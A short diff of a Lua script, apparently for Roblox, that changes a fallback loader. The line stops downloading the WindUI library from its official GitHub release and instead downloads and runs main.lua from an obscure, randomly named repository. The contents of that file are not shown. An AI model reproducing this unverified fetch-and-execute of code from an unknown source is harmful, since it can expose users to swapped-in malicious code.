@@ -15,7 +15,7 @@ do
     if ok then
         WindUI = result
     else 
-        WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
+        WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/xEvasl/fdsfsdfg/refs/heads/main/main.lua"))()
     end
 end
 
